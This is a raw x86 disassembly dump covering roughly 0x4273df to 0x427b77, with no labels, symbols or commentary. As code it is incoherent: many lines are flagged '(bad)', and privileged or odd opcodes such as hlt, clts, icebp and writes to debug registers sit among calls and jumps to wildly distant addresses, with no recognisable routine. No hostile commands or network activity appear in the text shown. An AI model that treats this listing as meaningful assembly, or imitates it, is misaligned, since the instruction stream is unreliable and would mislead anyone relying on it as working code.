  4273df:	scas   eax,DWORD PTR es:[edi]
  4273e0:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  4273e7:	mov    BYTE PTR [eax],0x8c
  4273ea:	push   0xffffff98
  4273ec:	push   edi
  4273ed:	xor    dl,BYTE PTR [eax+0x3b]
  4273f0:	mov    ecx,DWORD PTR [edi]
  4273f2:	call   0x8c41b955
  4273f7:	mov    eax,eax
  4273f9:	in     al,dx
  4273fa:	jge    0x427449
  4273fc:	mov    DWORD PTR [ebx],esi
  4273fe:	int3   
  4273ff:	add    eax,DWORD PTR [ebp+0xf]
  427402:	xor    eax,ecx
  427404:	(bad)  
  427405:	dec    ebp
  427406:	pushf  
  427407:	xor    ecx,eax
  427409:	add    edi,DWORD PTR [edi]
  42740b:	mov    eax,DWORD PTR [ebp-0x38]
  42740e:	rol    BYTE PTR [eax+edx*8-0x14cdfc68],1
  427415:	mov    DWORD PTR [edx+0xf4505c8],ecx
  42741b:	xor    edx,DWORD PTR [ecx+edi*4]
  42741e:	or     BYTE PTR [ebp-0x371600bd],0xf
  427425:	dec    ebp
  427426:	leave  
  427427:	mov    edx,ecx
  427429:	rol    BYTE PTR [ebp+0x330155],1
  42742f:	add    ecx,DWORD PTR [ebp+0xf]
  427432:	xor    eax,edx
  427434:	(bad)  
  427435:	ror    DWORD PTR [eax],0x86
  427438:	jb     0x427437
  42743a:	add    bh,bh
  42743c:	clc    
  42743d:	inc    ebp
  42743e:	jb     0x4274aa
  427440:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  427446:	cmp    BYTE PTR [ebx+0xc7d89c],cl
  42744c:	shr    BYTE PTR [eax-0x3d],0x30
  427450:	clc    
  427451:	add    BYTE PTR [ebp+0x75],al
  427454:	cmp    BYTE PTR [edx-0x64],ch
  427457:	inc    edi
  427459:	adc    al,0xe8
  42745b:	inc    ebp
  42745c:	test   DWORD PTR [ebp-0x7cba8b08],eax
  427462:	mov    ecx,DWORD PTR [eax]
  427464:	cld    
  427465:	or     DWORD PTR [ebp-0x34],0x33
  427469:	jbe    0x42746e
  42746b:	mov    edx,DWORD PTR [ecx+0x2b]
  42746e:	dec    ebp
  42746f:	mov    cl,BYTE PTR [ebx+0x45d801]
  427475:	mov    BYTE PTR [ebx],dh
  427477:	mov    eax,DWORD PTR [ebx]
  427479:	or     BYTE PTR [ecx+0x3b],dl
  42747c:	dec    ebp
  42747d:	int3   
  42747e:	xor    ebp,edi
  427480:	add    eax,DWORD PTR [ebp+0x51]
  427483:	mov    ecx,DWORD PTR [ebp-0x28]
  427486:	xor    eax,DWORD PTR [eax]
  427488:	add    ebp,DWORD PTR [eax+0x51]
  42748b:	adc    BYTE PTR [eax+0x0],0x8b
  42748f:	add    BYTE PTR [ebx+0x4d18fcff],cl
  427495:	inc    ebp
  427496:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  42749c:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  4274a2:	dec    ebp
  4274a3:	mov    esi,DWORD PTR [ebx]
  4274a5:	hlt    
  4274a6:	add    eax,ebx
  4274a8:	push   ecx
  4274a9:	inc    ebp
  4274aa:	dec    ebp
  4274ab:	sar    bh,1
  4274ad:	shl    ah,1
  4274af:	(bad)  
  4274b0:	retf   
  4274b1:	mov    al,ds:0xc5ff3dce
  4274b6:	adc    al,0xc6
  4274b8:	inc    ebp
  4274b9:	and    eax,0x9c0f4c85
  4274be:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  4274c5:	cmp    BYTE PTR [ebx+0x3b],0x0
  4274c9:	mov    dh,0xc7
  4274cb:	cmp    eax,eax
  4274cd:	jne    0x45436d19
  4274d3:	mov    edi,DWORD PTR [edx]
  4274d5:	mov    eax,0x848bcb9c
  4274da:	rcr    BYTE PTR [eax-0x7c7fcd0f],0x68
  4274e1:	or     BYTE PTR [edi],cl
  4274e3:	(bad)  
  4274e4:	dec    ebp
  4274e5:	inc    edi
  4274e6:	add    bh,0x50
  4274e9:	or     cl,ch
  4274eb:	test   DWORD PTR [eax+0x4d4501f8],ecx
  4274f1:	xchg   DWORD PTR [eax-0x1638af64],eax
  4274f7:	mov    esp,0xf802b588
  4274fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4274fd:	inc    ebp
  4274fe:	(bad)  
  4274ff:	cmp    al,0xff
  427501:	pushf  
  427502:	or     DWORD PTR [ecx+0x45ffe474],0x0
  427509:	mov    ecx,DWORD PTR [ebp-0x340018]
  42750f:	into   
  427510:	dec    DWORD PTR [ebx-0x7f72431c]
  427516:	push   0x5000ff01
  42751b:	retf   
  42751c:	inc    ebp
  42751d:	into   
  42751e:	dec    DWORD PTR [ebx-0x343f3ff4]
  427524:	push   eax
  427525:	into   
  427526:	call   0x4a79b6
  42752b:	retf   
  42752c:	add    dh,cl
  42752e:	add    bh,bh
  427530:	mov    DWORD PTR [eax+ecx*1],edx
  427533:	clc    
  427534:	inc    ebp
  427535:	inc    ebp
  427536:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  42753c:	push   0x1
  42753e:	push   edi
  42753f:	add    BYTE PTR [eax-0x35],dl
  427542:	mov    ecx,esi
  427544:	cld    
  427545:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  42754b:	into   
  42754c:	ror    BYTE PTR [ebx+0x75000800],0x50
  427553:	xor    eax,DWORD PTR [ebp+0x3]
  427556:	jne    0x4275a9
  427558:	call   DWORD PTR [eax-0x3c]
  42755b:	mov    DWORD PTR [ecx-0x18],edx
  42755e:	mov    edi,edi
  427560:	call   0x8b45bae9
  427565:	add    ah,ah
  427567:	rol    BYTE PTR [ebp-0x7c],0xeb
  42756b:	add    edi,edi
  42756d:	add    al,ch
  42756f:	inc    ebp
  427570:	push   ecx
  427571:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  427577:	mov    al,0xc7
  427579:	test   esp,esp
  42757b:	clc    
  42757c:	test   DWORD PTR [ebp-0x8],ecx
  42757f:	add    BYTE PTR [ebp+0x50],0x39
  427583:	jmp    0x8bcbfe24
  427588:	in     al,dx
  427589:	or     BYTE PTR [ebp-0xf],al
  42758c:	xor    eax,DWORD PTR [eax+0x4f896803]
  427592:	hlt    
  427593:	mov    eax,DWORD PTR [ebp-0x50]
  427596:	xor    esi,ecx
  427598:	add    eax,DWORD PTR [eax+0x4f086889]
  42759e:	inc    ebp
  42759f:	sbb    eax,0x68
  4275a2:	pushf  
  4275a3:	inc    edi
  4275a5:	add    al,ch
  4275a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4275a8:	test   edi,edi
  4275aa:	clc    
  4275ab:	inc    DWORD PTR [ebp-0x73]
  4275ae:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  4275b2:	(bad)  
  4275b3:	push   ecx
  4275b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275b5:	jne    0x42753c
  4275b7:	push   eax
  4275b8:	clc    
  4275b9:	test   DWORD PTR [ebp-0x1],eax
  4275bc:	cmp    eax,0xc78b9cff
  4275c1:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  4275c8:	inc    ebp
  4275c9:	push   edi
  4275ca:	aas    
  4275cb:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  4275d2:	dec    ebp
  4275d3:	add    BYTE PTR [ebx],dh
  4275d5:	inc    ebp
  4275d6:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  4275dc:	enter  0x8401,0x0
  4275e0:	add    al,BYTE PTR [eax]
  4275e2:	add    bh,bh
  4275e4:	out    dx,eax
  4275e5:	sbb    BYTE PTR [eax],al
  4275e7:	dec    ebp
  4275e8:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  4275ee:	sub    esi,DWORD PTR [ebx]
  4275f0:	mov    ebp,DWORD PTR [eax-0x8]
  4275f3:	add    bl,0x0
  4275f6:	(bad)  
  4275f7:	cmp    eax,ecx
  4275f9:	or     BYTE PTR [edx+0x750114],al
  4275ff:	inc    DWORD PTR [ebp+0x18]
  427602:	mov    eax,DWORD PTR [ebp-0x8]
  427605:	mov    ebx,eax
  427607:	(bad)  
  427608:	retf   
  427609:	inc    ebp
  42760a:	into   
  42760b:	mov    esi,eax
  42760d:	int3   
  42760e:	scas   eax,DWORD PTR es:[edi]
  42760f:	push   es
  427610:	mov    esi,DWORD PTR [ebp-0xc]
  427613:	call   DWORD PTR [ebp+0x18]
  427616:	sub    edi,DWORD PTR [ebp+0x3b]
  427619:	mov    esi,DWORD PTR [edi-0x34]
  42761c:	mov    eax,DWORD PTR [ebp-0x8]
  42761f:	cmp    bl,al
  427621:	pushf  
  427622:	mov    bh,0xbc
  427625:	fadd   QWORD PTR [eax]
  427627:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  42762d:	mov    esi,DWORD PTR [ebx]
  42762f:	in     al,0x33
  427631:	ret    
  427632:	add    eax,esi
  427634:	add    eax,DWORD PTR [ebp+0xf]
  427637:	mov    eax,ecx
  427639:	in     al,0x4d
  42763b:	ret    
  42763c:	mov    eax,esi
  42763e:	in     al,dx
  42763f:	inc    ebp
  427640:	rol    edi,1
  427642:	sar    al,1
  427644:	or     BYTE PTR [ebp+0x45e9f845],al
  42764a:	add    BYTE PTR [edx],bh
  42764c:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  427653:	test   ebx,eax
  427655:	clc    
  427656:	retf   
  427657:	inc    ebp
  427658:	into   
  427659:	cmp    al,0xc6
  42765b:	pushf  
  42765c:	scas   eax,DWORD PTR es:[edi]
  42765d:	(bad)  
  42765e:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  427665:	inc    ebp
  427666:	cmp    edi,DWORD PTR [esi]
  427668:	ja     0x427606
  42766a:	mov    eax,edi
  42766c:	mov    esp,0x458567a8
  427671:	clc    
  427672:	mov    eax,DWORD PTR [ebp-0x8]
  427675:	mov    eax,ebx
  427677:	in     al,dx
  427678:	retf   
  427679:	ret    
  42767a:	into   
  42767b:	mov    dh,0x7d
  42767e:	scas   eax,DWORD PTR es:[edi]
  42767f:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  427685:	add    BYTE PTR [ebx],ch
  427687:	jmp    0xb977c7
  42768c:	mov    eax,DWORD PTR [ebp-0x5c]
  42768f:	mov    eax,DWORD PTR [ebp-0x14]
  427692:	inc    ebp
  427693:	enter  0x458b,0xf8
  427697:	xor    eax,ebx
  427699:	add    ecx,ebx
  42769b:	cmp    ecx,esi
  42769d:	shufps xmm7,xmm4,0xaf
  4276a1:	add    BYTE PTR [ebx+0x55e8f48b],cl
  4276a7:	dec    ebp
  4276a8:	sub    esi,DWORD PTR [ebx]
  4276aa:	cmp    esi,DWORD PTR [ebx]
  4276ac:	ja     0x4276b1
  4276ae:	mov    eax,DWORD PTR [ebx]
  4276b0:	lods   al,BYTE PTR ds:[esi]
  4276b1:	mov    db0,ecx
  4276b4:	inc    ebp
  4276b5:	dec    ebp
  4276b6:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  4276bc:	retf   
  4276bd:	rol    dh,1
  4276bf:	or     al,0xce
  4276c1:	inc    ebp
  4276c2:	scas   eax,DWORD PTR es:[edi]
  4276c3:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  4276c9:	add    BYTE PTR [ebx],ch
  4276cb:	add    BYTE PTR [ebx],bh
  4276cd:	inc    ebp
  4276ce:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  4276d4:	inc    ebp
  4276d5:	retf   
  4276d6:	mov    ecx,esi
  4276d8:	clc    
  4276d9:	(bad)  
  4276da:	retf   
  4276db:	scas   eax,DWORD PTR es:[edi]
  4276dc:	ret    
  4276dd:	mov    ecx,esi
  4276df:	hlt    
  4276e0:	(bad)  
  4276e1:	push   ebp
  4276e2:	scas   eax,DWORD PTR es:[edi]
  4276e3:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  4276e9:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  4276ef:	add    BYTE PTR [ebx],al
  4276f1:	mov    eax,eax
  4276f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4276f4:	inc    ebp
  4276f5:	dec    ebp
  4276f6:	cmp    BYTE PTR [ebx],dh
  4276f8:	pushf  
  4276f9:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  4276ff:	(bad)  
  427701:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  427709:	sar    eax,1
  42770b:	rol    BYTE PTR [ebp+0x5],1
  42770e:	xor    eax,DWORD PTR [ebp+0x3]
  427711:	jmp    0x4276fe
  427713:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  427719:	xor    eax,DWORD PTR [ebp+0x33]
  42771c:	mov    eax,DWORD PTR [ebx]
  42771e:	rol    BYTE PTR [ebx],1
  427720:	test   BYTE PTR [edi],cl
  427722:	cwde   
  427723:	shl    DWORD PTR [edx],0x4d
  427726:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  42772c:	xor    edx,eax
  42772e:	add    eax,DWORD PTR ds:0xeb4d45e0
  427734:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  42773a:	add    BYTE PTR [ebx],dh
  42773c:	inc    ebp
  42773d:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  427743:	rdpmc  
  427745:	rol    DWORD PTR [ebx],0x4d
  427748:	loopne 0x4276d5
  42774a:	push   ebp
  42774b:	in     al,dx
  42774c:	mov    cl,dl
  42774e:	adc    eax,edx
  427750:	jb     0x427757
  427752:	add    BYTE PTR [ebp+0x45],al
  427755:	jmp    0x4276e2
  427757:	mov    ebx,eax
  427759:	test   al,0xcb
  42775b:	dec    ebp
  42775c:	dec    ebp
  42775d:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  427763:	add    ebx,DWORD PTR [eax-0x743ecdf1]
  427769:	dec    ebp
  42776a:	mov    al,0x8b
  42776c:	dec    ebp
  42776d:	in     al,dx
  42776e:	xor    edx,ecx
  427770:	xor    edx,eax
  427772:	add    eax,DWORD PTR [ebp+0x3]
  427775:	jbe    0x427786
  427777:	mov    eax,ecx
  427779:	test   al,0x45
  42777b:	dec    ebp
  42777c:	mov    DWORD PTR [ebx],esi
  42777e:	loopne 0x4277b3
  427780:	inc    ebp
  427781:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  427787:	rol    esi,0x45
  42778a:	scas   eax,DWORD PTR es:[edi]
  42778b:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  427791:	mov    eax,ecx
  427793:	hlt    
  427794:	dec    ebp
  427795:	inc    ebp
  427796:	mov    eax,edi
  427798:	loopne 0x427772
  42779a:	retf   
  42779b:	test   esi,ecx
  42779d:	clc    
  42779e:	scas   eax,DWORD PTR es:[edi]
  42779f:	inc    ebp
  4277a0:	mov    eax,edi
  4277a2:	fdiv   st,st(0)
  4277a4:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  4277aa:	cwde   
  4277ab:	cmp    dh,BYTE PTR [edx]
  4277ad:	pushf  
  4277ae:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  4277b4:	inc    esi
  4277b6:	mov    ebp,DWORD PTR [eax-0x10]
  4277b9:	inc    ebp
  4277ba:	dec    ebp
  4277bb:	xor    esi,DWORD PTR [ebx]
  4277bd:	add    eax,DWORD PTR [ebx]
  4277bf:	loopne 0x4277d0
  4277c1:	dec    ebp
  4277c2:	ror    DWORD PTR [edx+0x7233084d],0x3
  4277c9:	add    BYTE PTR [ebx-0x7b740bbb],cl
  4277cf:	lock cwde 
  4277d1:	ret    
  4277d2:	xor    al,BYTE PTR [ebp-0x77]
  4277d5:	mov    esi,esp
  4277d7:	rol    BYTE PTR [ebp-0x7c],1
  4277da:	xor    ebx,DWORD PTR [eax-0x7772cd47]
  4277e0:	call   edi
  4277e2:	enter  0x4d45,0x8b
  4277e6:	mov    esi,eax
  4277e8:	fmul   st(3),st
  4277ea:	push   ebp
  4277eb:	dec    ebp
  4277ec:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  4277f2:	ret    0xc198
  4277f5:	xor    al,BYTE PTR [esi-0x280276]
  4277fb:	dec    ebp
  4277fc:	jne    0x427831
  4277fe:	mov    eax,DWORD PTR [ebx]
  427800:	cld    
  427801:	loopne 0x4277b3
  427803:	push   ebp
  427804:	add    DWORD PTR [eax+0x72851100],ecx
  42780a:	inc    DWORD PTR [eax]
  42780c:	inc    DWORD PTR [ebp-0x75]
  42780f:	mov    edi,esp
  427811:	lock add bl,0x1
  427815:	retf   
  427816:	add    dh,al
  427818:	xor    dh,cl
  42781a:	inc    ebp
  42781b:	scas   eax,DWORD PTR es:[edi]
  42781c:	mov    eax,DWORD PTR [ebx]
  42781e:	shl    al,0x0
  427821:	inc    ebp
  427822:	dec    DWORD PTR [ebx+0x4dccf0ff]
  427828:	call   0x458a60
  42782d:	ud0    eax,ecx
  427830:	adc    al,0x4d
  427832:	inc    ebp
  427833:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  427839:	lock push 0x338055
  42783f:	add    eax,DWORD PTR [eax]
  427841:	ud0    ecx,edx
  427844:	sbb    BYTE PTR [ebp+0x5e],dl
  427847:	xor    ecx,ecx
  427849:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  427850:	push   ecx
  427851:	add    BYTE PTR [ebp-0x38],cl
  427854:	mov    DWORD PTR [esi-0x740004],eax
  42785a:	cld    
  42785b:	inc    ebp
  42785c:	xchg   edx,eax
  42785d:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  427863:	xabort 0xaf
  427866:	icebp  
  427867:	mov    esi,DWORD PTR [ebp-0x28]
  42786a:	(bad)  
  42786b:	retf   
  42786c:	or     ecx,eax
  42786e:	(bad)  
  42786f:	dec    ebp
  427870:	pop    es
  427871:	(bad)  
  427872:	(bad)  
  427873:	or     BYTE PTR [esi],al
  427875:	jb     0x42783d
  427877:	add    BYTE PTR [ebx],al
  427879:	inc    ebp
  42787a:	(bad)  
  42787b:	mov    ecx,DWORD PTR [edx]
  42787d:	fadd   st(6),st
  42787f:	ret    
  427880:	add    ch,BYTE PTR [eax-0x37]
  427883:	int    0x55
  427885:	sub    ebp,esp
  427887:	add    edx,DWORD PTR [ecx-0x14]
  42788a:	inc    ebp
  42788b:	inc    ebp
  42788c:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  427892:	cld    
  427893:	(bad)  
  427894:	mov    gs,WORD PTR [edi+0xf893be0]
  42789a:	mov    ebp,ebp
  42789c:	clc    
  42789d:	push   eax
  42789f:	push   DWORD PTR [ebp-0x4]
  4278a2:	mov    BYTE PTR [ebp+0xa],0xff
  4278a6:	(bad)  
  4278a7:	int3   
  4278a8:	or     BYTE PTR [eax],al
  4278aa:	(bad)  
  4278ab:	lea    eax,[edi]
  4278ad:	ins    BYTE PTR es:[edi],dx
  4278ae:	(bad)  
  4278af:	inc    DWORD PTR [ecx]
  4278b1:	push   eax
  4278b2:	mov    BYTE PTR [ebp+0x9],0x8b
  4278b6:	leave  
  4278b7:	les    edx,FWORD PTR [ebp+0x0]
  4278ba:	in     al,dx
  4278bb:	call   DWORD PTR [ecx-0x75]
  4278be:	inc    ebp
  4278bf:	cld    
  4278c0:	mov    DWORD PTR [eax+0x8b01fc],eax
  4278c6:	cld    
  4278c7:	xor    BYTE PTR [edi-0x76a8f98b],bh
  4278cd:	std    
  4278ce:	mov    eax,DWORD PTR [eax]
  4278d0:	clc    
  4278d1:	test   eax,esi
  4278d3:	je     0x42794a
  4278d5:	mov    eax,esi
  4278d7:	cld    
  4278d8:	add    al,0x80
  4278da:	add    WORD PTR [ecx+0x0],ax
  4278de:	fadd   QWORD PTR [eax]
  4278e0:	mov    BYTE PTR [eax],0xd0
  4278e3:	push   0xffffffc3
  4278e5:	push   edi
  4278e6:	mov    edx,DWORD PTR [eax+0x51]
  4278e9:	pop    edi
  4278ea:	lea    ebx,[ebx-0x8]
  4278ed:	ret    0x45
  4278f0:	mov    ecx,DWORD PTR [ebx-0x7241ae04]
  4278f6:	xchg   eax,edi
  4278f8:	mov    DWORD PTR [ebp-0x75],ecx
  4278fb:	push   esi
  4278fc:	clc    
  4278fd:	jne    0x4278cf
  4278ff:	mov    ecx,0xf8450b0b
  427904:	(bad)  
  427905:	push   cs
  427906:	or     BYTE PTR [ebp-0x3a],dh
  427909:	cmp    eax,DWORD PTR [ecx]
  42790b:	pop    esi
  42790c:	(bad)  
  42790d:	or     al,0x5
  42790f:	inc    eax
  427910:	leave  
  427911:	in     al,dx
  427912:	add    al,0x42
  427914:	push   esi
  427915:	and    eax,0xedc940cf
  42791a:	inc    DWORD PTR [eax-0x75]
  42791d:	fmul   QWORD PTR [ebx-0xf8739be]
  427923:	inc    eax
  427924:	nop
  427925:	jmp    0x518b:0x8b8bc3ff
  42792c:	(bad)  
  42792d:	lea    eax,ds:0xff45e8f8
  427933:	push   esi
  427934:	push   DWORD PTR [ebp-0x39]
  427937:	mov    eax,0x7edda46
  42793c:	or     al,0x6
  42793e:	push   DWORD PTR [ebp-0x3a]
  427941:	cmp    eax,DWORD PTR [edx]
  427943:	pop    esi
  427944:	ret    
  427945:	or     al,0x56
  427947:	inc    ecx
  427948:	push   ebp
  427949:	js     0x427937
  42794b:	inc    edx
  42794c:	inc    ebp
  42794d:	int    0x1
  42794f:	inc    ecx
  427950:	sub    BYTE PTR ds:0xe77541fc,ah
  427956:	add    DWORD PTR [edx+0x1c],eax
  427959:	int3   
  42795a:	mov    eax,ebx
  42795c:	adc    al,0x8b
  42795e:	xchg   edx,eax
  42795f:	push   ecx
  427960:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  427966:	rcl    DWORD PTR [esi-0x9],cl
  427969:	jne    0x4279bb
  42796b:	mov    eax,0x7c80ece
  427970:	rol    DWORD PTR [esi],cl
  427972:	div    DWORD PTR [ebp+0x50]
  427975:	cmp    ecx,edx
  427977:	pop    esi
  427978:	dec    BYTE PTR [edx]
  42797a:	in     al,dx
  42797b:	inc    edx
  42797c:	sub    ebp,ecx
  42797e:	inc    eax
  42797f:	(bad)  
  427980:	push   eax
  427981:	add    edx,DWORD PTR [eax-0x17]
  427984:	push   edi
  427985:	add    dh,dh
  427987:	leave  
  427988:	adc    DWORD PTR [ebp-0x1],0xffffffec
  42798c:	add    BYTE PTR [ecx+0x0],dl
  42798f:	inc    ebp
  427990:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  427996:	add    BYTE PTR [eax-0x7fbf448],bh
  42799c:	add    al,0x2
  42799e:	jmp    0x57e24f8
  4279a3:	jne    0x42798d
  4279a5:	mov    eax,DWORD PTR [edx]
  4279a7:	or     BYTE PTR [eax],al
  4279a9:	inc    ecx
  4279aa:	stc    
  4279ab:	in     eax,dx
  4279ac:	ss inc eax
  4279ae:	aas    
  4279af:	out    0x7d,eax
  4279b1:	inc    ecx
  4279b2:	mov    esi,ecx
  4279b4:	lock ret 0x7d
  4279b8:	and    ecx,DWORD PTR [ebx-0x171777]
  4279be:	add    bh,bh
  4279c0:	aad    0xd7
  4279c2:	add    dh,cl
  4279c4:	clts   
  4279c6:	(bad)  
  4279c7:	call   0xffcd78cc
  4279cc:	hlt    
  4279cd:	iret   
  4279ce:	jge    0x4279a6
  4279d0:	rol    DWORD PTR [esi-0x80],cl
  4279d3:	icebp  
  4279d4:	or     BYTE PTR [edi-0x27],cl
  4279d7:	(bad)  
  4279d8:	out    dx,al
  4279d9:	mov    eax,DWORD PTR [ebx]
  4279db:	(bad)  
  4279dc:	pop    esi
  4279dd:	push   es
  4279de:	cmp    al,0xe8
  4279e0:	sar    edi,0x8
  4279e3:	inc    DWORD PTR [edi]
  4279e5:	inc    esi
  4279e6:	(bad)  
  4279e7:	jmp    0x8b00:0x530e577e
  4279ee:	push   esi
  4279ef:	mov    eax,DWORD PTR [eax]
  4279f1:	and    al,0x0
  4279f3:	inc    ebp
  4279f4:	push   eax
  4279f5:	push   eax
  4279f6:	add    DWORD PTR [ebx+0x757d1834],ecx
  4279fc:	sub    edx,DWORD PTR [esi-0x24]
  4279ff:	jne    0x4279b7
  427a01:	lods   eax,DWORD PTR ds:[esi]
  427a02:	mov    edx,DWORD PTR [edx-0x34]
  427a05:	dec    esi
  427a06:	out    0x83,eax
  427a08:	into   
  427a09:	push   edi
  427a0b:	loopne 0x4279db
  427a0d:	shr    BYTE PTR [edx+ecx*4+0x0],1
  427a11:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  427a18:	rol    DWORD PTR [edx],0x8
  427a1b:	mov    esp,ecx
  427a1d:	cmp    DWORD PTR [ebx],0xc
  427a20:	mov    esi,0x5001c0
  427a25:	push   eax
  427a26:	push   cs
  427a27:	push   eax
  427a28:	(bad)  
  427a29:	sub    edx,edi
  427a2b:	push   esi
  427a2c:	adc    al,0xcb
  427a2e:	ins    DWORD PTR es:[edi],dx
  427a2f:	mov    eax,0x203e8
  427a34:	add    al,ah
  427a36:	ror    BYTE PTR [eax+0xc007c0],0xc0
  427a3d:	add    dh,al
  427a3f:	add    ah,ch
  427a41:	rol    DWORD PTR [ebx-0x3595fb0d],1
  427a47:	pop    ecx
  427a48:	or     eax,ebx
  427a4a:	cli    
  427a4b:	add    BYTE PTR [ecx-0x4e728d1e],dh
  427a51:	lea    ebp,[ebx]
  427a53:	mov    edx,DWORD PTR [edx-0x4]
  427a56:	dec    ecx
  427a57:	inc    ebp
  427a58:	shr    BYTE PTR [ebx],0x4b
  427a5b:	and    al,0x0
  427a5d:	(bad)  
  427a5e:	jne    0x427aa5
  427a60:	pop    eax
  427a61:	mov    al,0x5a
  427a63:	call   0x1417cc2
  427a68:	and    al,0x85
  427a6a:	push   edx
  427a6b:	add    BYTE PTR [eax+eax*1+0x0],ah
  427a6f:	dec    ebp
  427a70:	mov    cl,0x23
  427a72:	jmp    0x427a60
  427a74:	mov    al,0xe7
  427a76:	call   0x1387d64
  427a7b:	shr    DWORD PTR [eax+ebx*2],cl
  427a7e:	lock (bad) 
  427a80:	adc    eax,0x757f008d
  427a85:	out    0x58,eax
  427a87:	cmp    al,0x7
  427a89:	pop    edx
  427a8a:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  427a91:	push   ecx
  427a92:	cld    
  427a93:	mov    esi,0x3b0175
  427a98:	and    al,0xb0
  427a9a:	xor    BYTE PTR [edx+0x1],0x8b
  427a9e:	add    ah,bh
  427aa0:	mov    edi,DWORD PTR [ebp-0x4]
  427aa3:	psubsw mm7,QWORD PTR [edi]
  427aa6:	add    DWORD PTR [ebp+0x0],ebp
  427aa9:	rcr    eax,1
  427aab:	mov    edi,ecx
  427aad:	and    eax,DWORD PTR [eax]
  427aaf:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  427ab5:	call   0x12f7d9e
  427aba:	add    al,cl
  427abc:	mov    ebp,esi
  427abe:	aam    0x83
  427ac0:	or     DWORD PTR [ecx],eax
  427ac2:	jne    0x427ab5
  427ac4:	mov    eax,DWORD PTR [eax]
  427ac6:	aam    0x0
  427ac8:	dec    ebp
  427ac9:	jne    0x427a56
  427acb:	cmp    ebx,eax
  427acd:	jb     0x427b1c
  427acf:	jmp    0x427a5c
  427ad1:	mov    ebx,esp
  427ad3:	int3   
  427ad4:	dec    ebp
  427ad5:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  427adc:	mov    edx,0x8b0a8b
  427ae1:	cmp    ecx,DWORD PTR [eax]
  427ae3:	jb     0x427abc
  427ae5:	pop    edx
  427ae6:	push   edi
  427ae7:	cli    
  427ae8:	pop    es
  427ae9:	mov    eax,ecx
  427aeb:	jb     0x427aef
  427aed:	add    DWORD PTR [ebx],0xa
  427af0:	mov    eax,DWORD PTR [ebx]
  427af2:	int3   
  427af3:	add    bh,BYTE PTR [esi+0x75d10006]
  427af9:	jmp    0x427a86
  427afb:	mov    al,0xe8
  427afd:	call   0x1037d7f
  427b02:	add    edx,DWORD PTR [ecx+ecx*8]
  427b05:	pop    edi
  427b06:	or     BYTE PTR [ecx-0x73],bl
  427b09:	pop    ecx
  427b0a:	inc    edi
  427b0b:	xor    al,0xeb
  427b0d:	push   ecx
  427b0e:	mov    edi,DWORD PTR [edx+0xc506cc]
  427b14:	call   0xb17c19
  427b19:	int3   
  427b1a:	sbb    BYTE PTR [esi],ch
  427b1c:	inc    ebp
  427b1d:	add    BYTE PTR [ebx-0x1f4f338b],cl
  427b23:	call   0x9b7d92
  427b28:	or     BYTE PTR [ebx-0x73],dl
  427b2b:	cmp    al,0x47
  427b2d:	mov    al,0x1
  427b2f:	jb     0x427b31
  427b31:	mov    al,0x10
  427b33:	push   eax
  427b34:	add    al,0x75
  427b36:	add    BYTE PTR [ebx],ch
  427b38:	add    ebx,esp
  427b3a:	int3   
  427b3b:	jne    0x427b4d
  427b3d:	movsx  edx,cl
  427b40:	add    DWORD PTR [eax],eax
  427b42:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  427b49:	mov    gs,edi
  427b4b:	add    BYTE PTR [eax-0x50],ch
  427b4e:	add    al,ch
  427b50:	mov    eax,DWORD PTR [ecx]
  427b52:	sub    eax,DWORD PTR [eax]
  427b54:	jb     0x427bcb
  427b56:	add    DWORD PTR [esp+eiz*8-0x50],esi
  427b5a:	jge    0x427b44
  427b5c:	add    al,0x1
  427b5e:	add    DWORD PTR [eax],0x0
  427b61:	jne    0x427b63
  427b63:	je     0x427baa
  427b65:	mov    eax,DWORD PTR [edi]
  427b67:	ror    BYTE PTR [ebp+0x4d],1
  427b6a:	or     DWORD PTR [ecx+0x4d03d004],0x3
  427b71:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  427b77:	mov    DWORD PTR [ebx],ebp
